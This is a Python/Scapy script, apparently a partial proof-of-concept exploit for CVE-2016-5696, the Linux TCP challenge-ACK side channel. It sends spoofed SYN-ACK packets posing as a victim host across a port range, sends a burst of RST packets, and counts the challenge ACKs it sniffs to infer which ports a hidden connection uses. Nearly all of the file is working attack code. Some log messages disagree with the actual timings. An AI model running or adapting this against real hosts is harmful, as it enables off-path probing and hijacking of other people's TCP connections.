import logging
from scapy.all import *
from multiprocessing import Process,Pipe
import time

logging.basicConfig(level=logging.WARNING)
logger = logging.getLogger('CVE-2016-5696')
logger.setLevel(logging.DEBUG)

def findConnectedPort(srcHost,dstHost,dstPort):

    clientPort=random.randint(1024,65535)
    SYN=IP(dst=dstHost)/TCP(sport=clientPort,dport=dstPort,flags="S")
    SYNACK=sr1(SYN,verbose=False)
    ACK=IP(dst=dstHost)/TCP(sport=clientPort,dport=dstPort,flags="A",seq=SYNACK.ack, ack=SYNACK.seq + 1)
    send(ACK,verbose=False)

    narrowDownPortRange(srcHost,range(33000,34000),dstHost,dstPort,clientPort)
    

def narrowDownPortRange(srcHost,srcPortRange,dstHost,dstPort,clientPort):
    parentConn,childConn=Pipe()
    logger.debug("Ready to start a sub process to sniff packets")
    proc = Process(target=sniffChallengeAck, args=(dstPort,childConn,))
    proc.start()

    logger.info("Wait for 3 secs for sniff work...")
    time.sleep(1)

    packets=[]

    SYNACK=IP(src=srcHost,dst=dstHost)/TCP(sport=[i for i in srcPortRange],dport=dstPort,flags="SA")
    packets.extend(SYNACK)

    seqs=[x+2 for x in range(100)]
    logger.info("Enqueue %s RST packet(s)"%len(seqs))
    RST=IP(dst=dstHost)/TCP(sport=clientPort,dport=dstPort,flags="R",seq=seqs)
    packets.extend(RST)
    ans,unans=sr(packets,timeout=3,verbose=False)

    count=parentConn.recv();
    logger.info("Recv %s challenge ack(s) in range"%count)
    proc.join()

    return True if count==100 else False
    
    

def sniffChallengeAck(dstPort,childConn):
    logger.debug('Ready to sniff packets,wait for 15 secs...')
    packets=sniff(filter='tcp and port '+str(dstPort),timeout=5)
    logger.debug('End sniff packets,total %s'%len(packets))
    count=0
    for p in packets:
        if 'A'==p.sprintf('%TCP.flags%'):
            logger.debug("Found 1 challenge ack")
            count+= 1
    childConn.send(count)
    

    

    
